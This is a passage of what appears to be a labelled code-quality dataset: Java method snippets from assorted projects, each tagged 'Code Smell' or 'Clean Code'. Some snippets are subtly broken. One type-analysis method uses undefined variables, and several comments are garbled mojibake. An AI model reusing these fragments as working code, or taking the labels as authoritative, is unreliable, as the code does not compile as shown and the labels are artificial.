      boolean suc4Queue=waitForPermit(AGENT_GLOBAL_READER_QUEUE_PERMIT,lines.get(i).getData().length);
      if (!suc4Queue) {
        break;
      }
      putIntoQueue(lines.get(i));
    }
    MemoryManager.getInstance().release(AGENT_GLOBAL_READER_SOURCE_PERMIT,BATCH_READ_LINE_TOTAL_LEN);
    if (AgentUtils.getCurrentTime() - lastPrintTime > CORE_THREAD_PRINT_INTERVAL_MS) {
      lastPrintTime=AgentUtils.getCurrentTime();
      printCurrentState();
    }
  }
}",1,Code Smell
"/** 
 * Delete allowed(authorized) consumer group info
 * @param req       Http Servlet Request
 * @param sBuffer   string buffer
 * @param result    process result
 * @return    process result
 */
public StringBuilder adminDeleteConsumerGroupInfo(HttpServletRequest req,StringBuilder sBuffer,ProcessResult result){
  if (!WebParameterUtils.getAUDBaseInfo(req,false,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  BaseEntity opEntity=(BaseEntity)result.getRetData();
  if (!WebParameterUtils.getStringParamValue(req,WebFieldDef.COMPSTOPICNAME,true,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  Set<String> topicNameSet=(Set<String>)result.getRetData();
  if (!WebParameterUtils.getStringParamValue(req,WebFieldDef.COMPSGROUPNAME,false,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  Set<String> groupNameSet=(Set<String>)result.getRetData();
  List<GroupProcessResult> retInfoList=new ArrayList<>();
  if (groupNameSet.isEmpty()) {
    Map<String,List<GroupConsumeCtrlEntity>> topicConsumeCtrlMap=defMetaDataService.getConsumeCtrlByGroupName(topicNameSet);
    for (    Map.Entry<String,List<GroupConsumeCtrlEntity>> entry : topicConsumeCtrlMap.entrySet()) {
      if (!entry.getValue().isEmpty()) {
        for (        GroupConsumeCtrlEntity ctrlEntity : entry.getValue()) {
          if (ctrlEntity != null && ctrlEntity.getConsumeEnable() != EnableStatus.STATUS_DISABLE) {
            defMetaDataService.insertConsumeCtrlInfo(opEntity,ctrlEntity.getGroupName(),ctrlEntity.getTopicName(),EnableStatus.STATUS_DISABLE,""Old API delete, disable consume"",null,null,sBuffer,result);
          }
        }
      }
      result.setFullInfo(true,DataOpErrCode.DERR_SUCCESS.getCode(),""Ok"");
      retInfoList.add(new GroupProcessResult("""",entry.getKey(),result));
    }
  }
 else {
    GroupConsumeCtrlEntity ctrlEntity;
    for (    String groupName : groupNameSet) {
      for (      String topicName : topicNameSet) {
        ctrlEntity=defMetaDataService.getConsumeCtrlByGroupAndTopic(groupName,topicName);
        if (ctrlEntity != null && ctrlEntity.getConsumeEnable() != EnableStatus.STATUS_DISABLE) {
          retInfoList.add(defMetaDataService.insertConsumeCtrlInfo(opEntity,groupName,topicName,EnableStatus.STATUS_DISABLE,""Old API delete, disable consume"",null,null,sBuffer,result));
        }
 else {
          result.setFullInfo(true,DataOpErrCode.DERR_SUCCESS.getCode(),""Ok"");
          retInfoList.add(new GroupProcessResult(groupName,topicName,result));
        }
      }
    }
  }
  return buildRetInfo(retInfoList,sBuffer);
}
",1,Code Smell
"private void processTree(Path targetDir,ProcessMethod method) throws InterruptedException {
  Log.i(TAG,""Start to process file tree: "" + targetDir);
  try {
    Files.walkFileTree(targetDir,new SimpleFileVisitor<>(){
      @Override public FileVisitResult visitFile(      Path path,      BasicFileAttributes attrs){
        if (Thread.currentThread().isInterrupted()) {
          Log.w(TAG,""File process interrupted."");
          return FileVisitResult.TERMINATE;
        }
        if (path.getFileName().toString().equals("".nomedia""))         return FileVisitResult.CONTINUE;
        boolean shouldProcessHeader=checkShouldProcessHeader(path,method);
        boolean shouldProcessWhole=checkShouldProcessWhole(path,method);
        String endingMark=FILENAME_NO_PROCESS_MARK;
        if (shouldProcessHeader)         endingMark=FILENAME_HEADER_PROCESS_MARK;
        if (shouldProcessWhole)         endingMark=FILENAME_FULL_PROCESS_MARK;
        Path newPath=processFilename(path,method,endingMark);
        if (newPath != null) {
          if (shouldProcessWhole) {
            processWholeFile(newPath);
          }
 else           if (shouldProcessHeader) {
            processFileHeader(newPath);
          }
        }
        return FileVisitResult.CONTINUE;
      }
      @Override public FileVisitResult postVisitDirectory(      Path dir,      IOException e){
        if (dir != targetDir)         processFilename(dir,method,FILENAME_NO_PROCESS_MARK);
        return FileVisitResult.CONTINUE;
      }
    }
);
  }
 catch (  IOException e) {
    Log.w(TAG,String.format(""While processing '%s': %s"",targetDir.getFileName(),e));
  }
  if (Thread.interrupted()) {
    throw new InterruptedException();
  }
}
",1,Code Smell
"/** 
 * Performs an intra-procedural analysis to compute available type information for reflective call  {@code invoke}.
 */
private static TypeInfo computeTypeInfo(Invoke invoke){
  List<Stmt> stmts=invoke.getContainer().getIR().getStmts();
  Var result=invoke.getResult();
  Type returnType=null;
  if (result != null) {
    for (int i=invoke.getIndex() + 1; i < stmts.size(); ++i) {
      Stmt stmt=stmts.get(i);
      if (stmt.getUses().contains(result) && returnType != null) {
        returnType=null;
        break;
      }
      if (stmt instanceof Cast && cast.getRValue().getValue().equals(result)) {
        assert returnType == null;
        returnType=cast.getRValue().getCastType();
      }
    }
  }
  if (invoke.getInvokeExp().getArgCount() == 0) {
    return new TypeInfo(returnType,List.of());
  }
  int argIndex=argIndexes.get(invoke.getMethodRef().getName());
  Var args=invoke.getInvokeExp().getArg(argIndex);
  Type[] argTypes=null;
  if (args.isConst()) {
    argTypes=new Type[0];
  }
 else {
    assert args.getType() instanceof ArrayType;
    DefinitionStmt<?,?> argDef=null;
    for (int i=invoke.getIndex() - 1; i >= 0; --i) {
      Stmt stmt=stmts.get(i);
      if (stmt instanceof DefinitionStmt<?,?>) {
        LValue lValue=defStmt.getLValue();
        if (args.equals(lValue)) {
          if (argDef == null) {
            argDef=defStmt;
            int length=getArrayLength(defStmt.getRValue());
            if (length != -1) {
              argTypes=new Type[length];
            }
 else {
              break;
            }
          }
 else {
            argTypes=null;
            break;
          }
        }
      }
    }
    if (argTypes != null) {
      for (int i=argDef.getIndex(); i < stmts.size(); ++i) {
        Stmt stmt=stmts.get(i);
        if (stmt instanceof StoreArray) {
          ArrayAccess arrayAccess=storeArray.getArrayAccess();
          if (arrayAccess.getBase().equals(args)) {
            Var index=arrayAccess.getIndex();
            if (index.isConst()) {
              int iIndex=((IntLiteral)index.getConstValue()).getValue();
              if (argTypes[iIndex] == null) {
                argTypes[iIndex]=storeArray.getRValue().getType();
              }
 else {
                argTypes=null;
                break;
              }
            }
 else {
              argTypes=null;
              break;
            }
          }
        }
      }
      if (argTypes != null) {
        for (int i=0; i < argTypes.length; ++i) {
          if (argTypes[i] == null) {
            argTypes[i]=NullType.NULL;
          }
        }
      }
    }
  }
  List<Type> argumentTypes=(argTypes != null) ? List.of(argTypes) : null;
  return (returnType == null && argumentTypes == null) ? UNKNOWN : new TypeInfo(returnType,argumentTypes);
}",1,Code Smell
"/** 
 * AUTHENTIKEY           
 */
public APDUResponse cardTransmit(APDUCommand plainApdu){
  boolean isApduTransmitted=false;
  do {
    try {
      byte[] apduBytes=plainApdu.serialize();
      byte ins=apduBytes[1];
      boolean isEncrypted=false;
      if (status == null) {
        APDUCommand statusCapdu=new APDUCommand(0xB0,INS_GET_STATUS,0x00,0x00,new byte[0]);
        APDUResponse statusRapdu=this.cardTransport.send(statusCapdu);
        status=new SatoCardStatus(statusRapdu);
      }
      APDUCommand capdu=plainApdu;
      if (status.needsSecureChannel() && (ins != 0xA4) && (ins != 0x81)&& (ins != 0x82)&& (ins != INS_GET_STATUS)) {
        if (!secureChannel.initializedSecureChannel()) {
          APDUResponse secChannelRapdu=this.cardInitiateSecureChannel();
          byte[] pubkey=this.parser.parseInitiateSecureChannel(secChannelRapdu);
          this.secureChannel.initiateSecureChannel(pubkey);
        }
        capdu=secureChannel.encryptSecureChannel(plainApdu);
        isEncrypted=true;
      }
      APDUResponse rapdu=this.cardTransport.send(capdu);
      int sw12=rapdu.getSw();
      if (sw12 == 0x9000) {
        if (isEncrypted) {
          rapdu=secureChannel.decryptSecureChannel(rapdu);
        }
        isApduTransmitted=true;
        return rapdu;
      }
 else       if (sw12 == 0x9C06) {
        log.error(""Error, Satochip PIN required"");
        throw new CardAuthorizationException(""PIN is required"");
      }
 else       if (sw12 == 0x9C21) {
        log.error(""Error, Satochip secure channel required"");
        secureChannel.resetSecureChannel();
      }
 else {
        isApduTransmitted=true;
        return rapdu;
      }
    }
 catch (    Exception e) {
      log.warn(""Error transmitting Satochip command set"" + e);
      return new APDUResponse(new byte[0],(byte)0x00,(byte)0x00);
    }
  }
 while (!isApduTransmitted);
  return new APDUResponse(new byte[0],(byte)0x00,(byte)0x00);
}",1,Code Smell
"private void highlightRowInternal(RecyclerListView.IntReturnCallback callback,int removeAfter,boolean canHighlightLater){
  if (removeHighlighSelectionRunnable != null) {
    AndroidUtilities.cancelRunOnUIThread(removeHighlighSelectionRunnable);
    removeHighlighSelectionRunnable=null;
  }
  RecyclerView.ViewHolder holder=findViewHolderForAdapterPosition(callback.run());
  if (holder != null) {
    positionSelector(highlightPosition=holder.getLayoutPosition(),holder.itemView);
    if (selectorDrawable != null) {
      final Drawable d=selectorDrawable.getCurrent();
      if (d instanceof TransitionDrawable) {
        if (onItemLongClickListener != null || onItemClickListenerExtended != null) {
          ((TransitionDrawable)d).startTransition(ViewConfiguration.getLongPressTimeout());
        }
 else {
          ((TransitionDrawable)d).resetTransition();
        }
      }
      if (Build.VERSION.SDK_INT >= 21) {
        selectorDrawable.setHotspot(holder.itemView.getMeasuredWidth() / 2,holder.itemView.getMeasuredHeight() / 2);
      }
    }
    if (selectorDrawable != null && selectorDrawable.isStateful()) {
      if (selectorDrawable.setState(getDrawableStateForSelector())) {
        invalidateDrawable(selectorDrawable);
      }
    }
    if (removeAfter > 0) {
      AndroidUtilities.runOnUIThread(removeHighlighSelectionRunnable=() -> {
        removeHighlighSelectionRunnable=null;
        pendingHighlightPosition=null;
        if (selectorDrawable != null) {
          Drawable d=selectorDrawable.getCurrent();
          if (d instanceof TransitionDrawable) {
            ((TransitionDrawable)d).resetTransition();
          }
        }
        if (selectorDrawable != null && selectorDrawable.isStateful()) {
          selectorDrawable.setState(StateSet.NOTHING);
        }
      }
,removeAfter);
    }
  }
 else   if (canHighlightLater) {
    pendingHighlightPosition=callback;
  }
}",1,Code Smell
"private Result opGrantOrRevokePermissions(boolean isGrant){
  String[] permissions=mArgs.getStringArray(ARG_PERMISSIONS);
  List<UserPackagePair> failedPackages=new ArrayList<>();
  float lastProgress=mProgressHandler != null ? mProgressHandler.getLastProgress() : 0;
  if (permissions.length == 1 && permissions[0].equals(""*"")) {
    int i=0;
    for (    UserPackagePair pair : mUserPackagePairs) {
      updateProgress(lastProgress,++i);
      try {
        permissions=PackageUtils.getPermissionsForPackage(pair.getPackageName(),pair.getUserId());
        if (permissions == null)         continue;
        for (        String permission : permissions) {
          if (isGrant) {
            PermissionCompat.grantPermission(pair.getPackageName(),permission,pair.getUserId());
          }
 else {
            PermissionCompat.revokePermission(pair.getPackageName(),permission,pair.getUserId());
          }
        }
      }
 catch (      Throwable e) {
        log(""====> op=GRANT_OR_REVOKE_PERMISSIONS, pkg="" + pair,e);
        failedPackages.add(pair);
      }
    }
  }
 else {
    int i=0;
    for (    UserPackagePair pair : mUserPackagePairs) {
      updateProgress(lastProgress,++i);
      for (      String permission : permissions) {
        try {
          if (isGrant) {
            PermissionCompat.grantPermission(pair.getPackageName(),permission,pair.getUserId());
          }
 else {
            PermissionCompat.revokePermission(pair.getPackageName(),permission,pair.getUserId());
          }
        }
 catch (        Throwable e) {
          log(""====> op=GRANT_OR_REVOKE_PERMISSIONS, pkg="" + pair,e);
          failedPackages.add(pair);
        }
      }
    }
  }
  return new Result(failedPackages);
}",1,Code Smell
"public GProRetentionGuildListRsp(){
  this.recommendChannels=new ArrayList<>();
  this.cookies=new byte[0];
}
public GProRetentionGuildListRsp(ArrayList<GProRetentionChannelInfo> arrayList,int i2,byte[] bArr,boolean z){
  this.recommendChannels=new ArrayList<>();
  this.cookies=new byte[0];
  this.recommendChannels=arrayList;
  this.nextTs=i2;
  this.cookies=bArr;
  this.isEnd=z;
}",0,Clean Code
"public static RollRogueBuffScRsp parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new RollRogueBuffScRsp(),data).checkInitialized();
}
public static RollRogueBuffScRsp parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new RollRogueBuffScRsp(),input).checkInitialized();
}
public static RollRogueBuffScRsp parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new RollRogueBuffScRsp(),input).checkInitialized();
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.common.tree.protos.LeafNodeProto)) {
    return super.equals(obj);
  }
  org.tribuo.common.tree.protos.LeafNodeProto other=(org.tribuo.common.tree.protos.LeafNodeProto)obj;
  if (getParentIdx() != other.getParentIdx())   return false;
  if (getCurIdx() != other.getCurIdx())   return false;
  if (java.lang.Double.doubleToLongBits(getImpurity()) != java.lang.Double.doubleToLongBits(other.getImpurity()))   return false;
  if (hasOutput() != other.hasOutput())   return false;
  if (hasOutput()) {
    if (!getOutput().equals(other.getOutput()))     return false;
  }
  if (!internalGetScore().equals(other.internalGetScore()))   return false;
  if (getGeneratesProbabilities() != other.getGeneratesProbabilities())   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"@Override public FarmStageGachaInfo clone(){
  return new FarmStageGachaInfo().copyFrom(this);
}
",0,Clean Code
"private boolean isCollapseMiuiTitleApps(){
  return mPrefsMap.getStringAsInt(""various_collapse_miui_title"",0) != 0 && collapseMiuiTitleApps.contains(mPackageName);
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(worldLevel);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(wave);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(cocoonId);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(propEntityId);
  }
  return size;
}",0,Clean Code
"public LocalStackContainer(DockerImageName dockerImageName){
  super(dockerImageName);
  withCreateContainerCmdModifier(cmd -> cmd.withEntrypoint(""sh""));
  setCommand(""-c"",""while [ ! -f "" + STARTER_SCRIPT + "" ]; do sleep 0.1; done; ""+ STARTER_SCRIPT);
  withEnv(""LOCALSTACK_HOST"",""localhost.localstack.cloud"");
  withEnv(""SERVICES"",""opensearch"");
}",0,Clean Code
"/** 
 * Start preloading the widget.
 */
private boolean preloadWidget(){
  final LauncherAppWidgetProviderInfo pInfo=mInfo.info;
  if (pInfo.isCustomWidget()) {
    return false;
  }
  final Bundle options=mInfo.getDefaultSizeOptions(mLauncher);
  if (mInfo.getHandler().needsConfigure()) {
    mInfo.bindOptions=options;
    return false;
  }
  mBindWidgetRunnable=new Runnable(){
    @Override public void run(){
      mWidgetLoadingId=mLauncher.getAppWidgetHolder().allocateAppWidgetId();
      if (LOGD) {
        Log.d(TAG,""Binding widget, id: "" + mWidgetLoadingId);
      }
      if (new WidgetManagerHelper(mLauncher).bindAppWidgetIdIfAllowed(mWidgetLoadingId,pInfo,options)) {
        mHandler.post(mInflateWidgetRunnable);
      }
    }
  }
;
  mInflateWidgetRunnable=new Runnable(){
    @Override public void run(){
      if (LOGD) {
        Log.d(TAG,""Inflating widget, id: "" + mWidgetLoadingId);
      }
      if (mWidgetLoadingId == -1) {
        return;
      }
      AppWidgetHostView hostView=mLauncher.getAppWidgetHolder().createView((Context)mLauncher,mWidgetLoadingId,pInfo);
      mInfo.boundWidget=hostView;
      mWidgetLoadingId=-1;
      hostView.setVisibility(View.INVISIBLE);
      int[] unScaledSize=mLauncher.getWorkspace().estimateItemSize(mInfo);
      DragLayer.LayoutParams lp=new DragLayer.LayoutParams(unScaledSize[0],unScaledSize[1]);
      lp.x=lp.y=0;
      lp.customPosition=true;
      hostView.setLayoutParams(lp);
      if (LOGD) {
        Log.d(TAG,""Adding host view to drag layer"");
      }
      mLauncher.getDragLayer().addView(hostView);
      mView.setTag(mInfo);
    }
  }
;
  if (LOGD) {
    Log.d(TAG,""About to bind/inflate widget"");
  }
  mHandler.post(mBindWidgetRunnable);
  return true;
}",0,Clean Code
"@Override public SingleCallGraphRootTreeNode getRootNode(){
  return (SingleCallGraphRootTreeNode)getAbstractRootNode();
}
",0,Clean Code
"@Override protected Boolean computeValue(Class<?> type){
  try {
    return (boolean)IS_RECORD.invoke(type);
  }
 catch (  IllegalAccessException|InvocationTargetException e) {
    throw new RuntimeException(e);
  }
}
@Override protected RecordComponent[] computeValue(Class<?> type){
  try {
    MethodHandles.Lookup lookup=_JDKAccess._trustedLookup(type);
    Object[] components=(Object[])GET_RECORD_COMPONENTS.invoke(type);
    RecordComponent[] recordComponents=new RecordComponent[components.length];
    for (int i=0; i < components.length; i++) {
      Object component=components[i];
      Method accessor=(Method)GET_ACCESSOR.invoke(component);
      Class<?> fieldType=(Class<?>)GET_TYPE.invoke(component);
      MethodHandle handle=lookup.unreflect(accessor);
      Object getter=_JDKAccess.makeGetterFunction(lookup,handle,fieldType);
      recordComponents[i]=new RecordComponent((Class<?>)GET_DECLARING_RECORD.invoke(component),(String)GET_NAME.invoke(component),fieldType,(Type)GET_GENERIC_TYPE.invoke(component),accessor,getter);
    }
    return recordComponents;
  }
 catch (  IllegalAccessException|InvocationTargetException e) {
    throw new RuntimeException(e);
  }
}
@Override protected Tuple2<Constructor,MethodHandle> computeValue(Class<?> type){
  RecordComponent[] components=RecordUtils.getRecordComponents(type);
  if (components == null) {
    return null;
  }
  Class<?>[] paramTypes=Arrays.stream(components).map(RecordComponent::getType).toArray(Class<?>[]::new);
  Constructor constructor;
  try {
    constructor=type.getDeclaredConstructor(paramTypes);
  }
 catch (  NoSuchMethodException e) {
    throw new RuntimeException(e);
  }
  MethodHandles.Lookup lookup=_JDKAccess._trustedLookup(type);
  if (lookup != null) {
    try {
      MethodHandle handle=lookup.findConstructor(type,MethodType.methodType(void.class,paramTypes));
      return Tuple2.of(constructor,handle);
    }
 catch (    NoSuchMethodException|IllegalAccessException e) {
      return Tuple2.of(constructor,null);
    }
  }
 else {
    return Tuple2.of(constructor,null);
  }
}",0,Clean Code
"public static SceneEntityInfo parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new SceneEntityInfo(),data).checkInitialized();
}
public static SceneEntityInfo parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new SceneEntityInfo(),input).checkInitialized();
}
public static SceneEntityInfo parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new SceneEntityInfo(),input).checkInitialized();
}
",0,Clean Code
"public String getBytesReserveInfo(){
  return this.bytesReserveInfo;
}
",0,Clean Code
"@Override public void removedNode(final ZyGraphNode<? extends IViewNode<?>> removedNode){
  for (int j=0; j < getChildCount(); ++j) {
    final SelectionHistoryTreeNode leaf=(SelectionHistoryTreeNode)getChildAt(j);
    if (leaf.getNode() == removedNode) {
      ((DefaultTreeModel)getTree().getModel()).removeNodeFromParent(leaf);
      leaf.removeFromParent();
      setUserObject(new SelectionHistoryTreeNodeWrapper(snapshot,snapshotCount));
      break;
    }
  }
}",0,Clean Code
"@Bean public TitanEmbeddingBedrockApi titanEmbeddingApi(){
  return new TitanEmbeddingBedrockApi(TitanEmbeddingModel.TITAN_EMBED_IMAGE_V1.id(),EnvironmentVariableCredentialsProvider.create(),Region.US_EAST_1.id(),new ObjectMapper(),Duration.ofMinutes(2));
}",0,Clean Code
"@Override public void writeTo(ProtoSink output) throws IOException {
  output.writeRawBytes(data);
}
",0,Clean Code
"void setSelected(boolean selected);
",0,Clean Code
"@Override public void init(){
  mPackageManagerService=findClassIfExists(""com.android.server.pm.PackageManagerService"");
  findAndHookMethod(mPackageManagerService,""systemReady"",new MethodHook(){
    @Override protected void after(    MethodHookParam param) throws Throwable {
      Context mContext=(Context)XposedHelpers.getObjectField(param.thisObject,""mContext"");
      Handler mHandler=(Handler)XposedHelpers.getObjectField(param.thisObject,""mHandler"");
      new PrefsChangeObserver(mContext,mHandler,""prefs_key_system_framework_clean_share_apps""){
        @Override public void onChange(        String name){
          mPrefsMap.put(name,PrefsUtils.getSharedStringSetPrefs(mContext,name));
        }
      }
;
    }
  }
);
  MethodHook hook=new MethodHook(){
    @Override @SuppressWarnings(""unchecked"") protected void after(    MethodHookParam param) throws Throwable {
      try {
        if (param.args[0] == null)         return;
        Intent origIntent=(Intent)param.args[0];
        String action=origIntent.getAction();
        if (action == null)         return;
        if (!action.equals(Intent.ACTION_SEND) && !action.equals(Intent.ACTION_SENDTO) && !action.equals(Intent.ACTION_SEND_MULTIPLE))         return;
        Intent intent=(Intent)origIntent.clone();
        if (intent.getDataString() != null && intent.getDataString().contains("":""))         return;
        if (intent.hasExtra(""HyperCeiler"") && intent.getBooleanExtra(""HyperCeiler"",false))         return;
        Set<String> selectedApps=mPrefsMap.getStringSet(""system_framework_clean_share_apps"");
        List<ResolveInfo> resolved=(List<ResolveInfo>)param.getResult();
        ResolveInfo resolveInfo;
        Context mContext=(Context)XposedHelpers.getObjectField(param.thisObject,""mContext"");
        PackageManager pm=mContext.getPackageManager();
        Iterator<ResolveInfo> itr=resolved.iterator();
        while (itr.hasNext()) {
          resolveInfo=itr.next();
          boolean removeOriginal=selectedApps.contains(resolveInfo.activityInfo.packageName) || selectedApps.contains(resolveInfo.activityInfo.packageName + ""|0"");
          boolean removeDual=selectedApps.contains(resolveInfo.activityInfo.packageName + ""|999"");
          boolean hasDual=false;
          try {
            hasDual=XposedHelpers.callMethod(pm,""getPackageInfoAsUser"",resolveInfo.activityInfo.packageName,0,999) != null;
          }
 catch (          Throwable ignore) {
          }
          if ((removeOriginal && !hasDual) || removeOriginal && hasDual && removeDual)           itr.remove();
        }
        param.setResult(resolved);
      }
 catch (      Throwable t) {
        if (!(t instanceof BadParcelableException))         logE(TAG,CleanShareMenu.this.lpparam.packageName,t);
      }
    }
  }
;
  String ActQueryService=isMoreAndroidVersion(33) ? ""com.android.server.pm.ComputerEngine"" : ""com.android.server.pm.PackageManagerService$ComputerEngine"";
  hookAllMethods(ActQueryService,lpparam.classLoader,""queryIntentActivitiesInternal"",hook);
}",0,Clean Code
"public RedisMetadataDAO(JedisProxy jedisProxy,ObjectMapper objectMapper,ConductorProperties conductorProperties,RedisProperties properties){
  super(jedisProxy,objectMapper,conductorProperties,properties);
  refreshTaskDefs();
  long cacheRefreshTime=properties.getTaskDefCacheRefreshInterval().getSeconds();
  Executors.newSingleThreadScheduledExecutor().scheduleWithFixedDelay(this::refreshTaskDefs,cacheRefreshTime,cacheRefreshTime,TimeUnit.SECONDS);
}
",0,Clean Code
"/** 
 * Build the input streams consisting of all-zero input streams and non-zero input streams. When reading from the non-zero input streams, the data is actually read from the original input stream. The size of each input stream is introduced by the sparse headers. NOTE : Some all-zero input streams and non-zero input streams have the size of 0. We DO NOT store the 0 size input streams because they are meaningless.
 */
private void buildSparseInputStreams() throws IOException {
  currentSparseInputStreamIndex=-1;
  sparseInputStreams=new ArrayList<>();
  final List<TarArchiveStructSparse> sparseHeaders=currEntry.getSparseHeaders();
  if (sparseHeaders != null && sparseHeaders.size() > 1) {
    final Comparator<TarArchiveStructSparse> sparseHeaderComparator=(p,q) -> {
      final Long pOffset=p.getOffset();
      final Long qOffset=q.getOffset();
      return pOffset.compareTo(qOffset);
    }
;
    Collections.sort(sparseHeaders,sparseHeaderComparator);
  }
  if (sparseHeaders != null) {
    final InputStream zeroInputStream=new TarArchiveSparseZeroInputStream();
    long offset=0;
    for (    final TarArchiveStructSparse sparseHeader : sparseHeaders) {
      if (sparseHeader.getOffset() == 0 && sparseHeader.getNumbytes() == 0) {
        break;
      }
      if ((sparseHeader.getOffset() - offset) < 0) {
        throw new IOException(""Corrupted struct sparse detected"");
      }
      if ((sparseHeader.getOffset() - offset) > 0) {
        sparseInputStreams.add(new BoundedInputStream(zeroInputStream,sparseHeader.getOffset() - offset));
      }
      if (sparseHeader.getNumbytes() > 0) {
        sparseInputStreams.add(new BoundedInputStream(inputStream,sparseHeader.getNumbytes()));
      }
      offset=sparseHeader.getOffset() + sparseHeader.getNumbytes();
    }
  }
  if (!sparseInputStreams.isEmpty()) {
    currentSparseInputStreamIndex=0;
  }
}",0,Clean Code
"@TruffleBoundary public final boolean startsWith(VmCollection other){
  if (getLength() < other.getLength())   return false;
  var iter=iterator();
  var otherIter=other.iterator();
  while (otherIter.hasNext()) {
    if (!iter.next().equals(otherIter.next()))     return false;
  }
  return true;
}
",0,Clean Code
"Role getRole();
",0,Clean Code
"public GroupNotifyUser getUser1(){
  return this.user1;
}",0,Clean Code
"/** 
 * Update data source connection
 * @param param
 * @return
 */
DataResult<Long> updateWithPermission(DataSourceUpdateParam param);
",0,Clean Code
"/** 
 * 灏嗗璞¤浆鎹负 {@linkplain Category}鍒楄〃銆� <p> 鏀寔鏍煎紡濡備笅锛� </p> <p> <code>""...""</code> </p> <p> <code>{ ... }</code> </p> <p> <code>[ { ... }, ..., ""..."", ... ]</code> </p>
 * @param obj
 * @return
 */
protected List<Category> convertToCategories(Object obj){
  List<Category> categories=new ArrayList<Category>(1);
  convertToCategories(categories,obj);
  return categories;
}
protected void convertToCategories(List<Category> categories,Object obj){
  if (obj == null)   return;
 else   if (obj instanceof Category)   categories.add((Category)obj);
 else   if (obj instanceof String) {
    Category category=createCategory();
    category.setName((String)obj);
    categories.add(category);
  }
 else   if (obj instanceof Map<?,?>) {
    @SuppressWarnings(""unchecked"") Map<String,?> map=(Map<String,?>)obj;
    String name=(String)map.get(Category.PROPERTY_NAME);
    if (name == null)     return;
    Category category=createCategory();
    category.setName(name);
    category.setNameLabel(convertToLabel(map.get(Category.PROPERTY_NAME_LABEL)));
    category.setDescLabel(convertToLabel(map.get(Category.PROPERTY_DESC_LABEL)));
    category.setOrder(convertToInt(map.get(Category.PROPERTY_ORDER),category.getOrder()));
    categories.add(category);
  }
 else   if (obj instanceof Collection<?>) {
    Collection<?> collection=(Collection<?>)obj;
    for (    Object ele : collection)     convertToCategories(categories,ele);
  }
 else   if (obj instanceof Object[]) {
    Object[] array=(Object[])obj;
    for (    Object ele : array)     convertToCategories(categories,ele);
  }
 else   throw new UnsupportedOperationException(""Convert object of type ["" + obj.getClass().getName() + ""] to [""+ Category.class.getName()+ ""] is not supported"");
}",0,Clean Code
"/** 
 * <code>optional double defence = 3;</code>
 * @return this
 */
public AvatarProperty clearDefence(){
  bitField0_&=~0x00000004;
  defence=0D;
  return this;
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(dMJLJNDFOGP);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(kHBDIKDDIIB);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=(1 * rogueMiracleList.length()) + ProtoSink.computeRepeatedMessageSizeNoTag(rogueMiracleList);
  }
  return size;
}",0,Clean Code
"private static String parseAccessDesc(int access){
  if (access == 0) {
    return """";
  }
  StringBuilder r=new StringBuilder();
  if (TypeUtil.isPublic(access)) {
    r.append(""public "");
  }
 else   if (TypeUtil.isProtected(access)) {
    r.append(""protected "");
  }
 else   if (TypeUtil.isPrivate(access)) {
    r.append(""private "");
  }
  if (TypeUtil.isStatic(access)) {
    r.append(""static "");
  }
  if (TypeUtil.isFinal(access)) {
    r.append(""final "");
  }
  if (TypeUtil.isNative(access)) {
    r.append(""native "");
  }
  return r.toString();
}",0,Clean Code
"public String getWinRate(){
  return this.winRate;
}
",0,Clean Code
"@Override public String toString(){
  return ""Embedding {"" + "" vector = "" + Arrays.toString(vector) + "" }"";
}
",0,Clean Code
"/** 
 * 瑙ｆ瀽琛ㄨ揪寮忓弬鏁�
 * @param expression
 * @return
 */
public static Set<String> parseArgs(String expression,String regex){
  Set<String> args=new HashSet<>();
  if (StrUtil.isNotEmpty(expression)) {
    Pattern pattern=Pattern.compile(regex);
    Matcher matcher=pattern.matcher(expression);
    while (matcher.find()) {
      args.add(matcher.group(0));
    }
  }
  return args;
}",0,Clean Code
"@Override public String toString(){
  return toHexString();
}
",0,Clean Code
"int getSlideOutDistance(){
  int distance;
  if (mOrientation == VERTICAL) {
    distance=-getHeight();
    if (getChildCount() > 0) {
      int top=getChildAt(0).getTop();
      if (top < 0) {
        distance=distance + top;
      }
    }
  }
 else {
    if ((mFlag & PF_REVERSE_FLOW_PRIMARY) != 0) {
      distance=getWidth();
      if (getChildCount() > 0) {
        int start=getChildAt(0).getRight();
        if (start > distance) {
          distance=start;
        }
      }
    }
 else {
      distance=-getWidth();
      if (getChildCount() > 0) {
        int start=getChildAt(0).getLeft();
        if (start < 0) {
          distance=distance + start;
        }
      }
    }
  }
  return distance;
}",0,Clean Code
"@Override public LlamaChatResponse chatCompletion(LlamaChatRequest request){
  return this.internalInvocation(request,LlamaChatResponse.class);
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code GetGachaCeilingCsReq}
 */
public static GetGachaCeilingCsReq newInstance(){
  return new GetGachaCeilingCsReq();
}
",0,Clean Code
"public Builder withStream(boolean stream){
  this.stream=stream;
  return this;
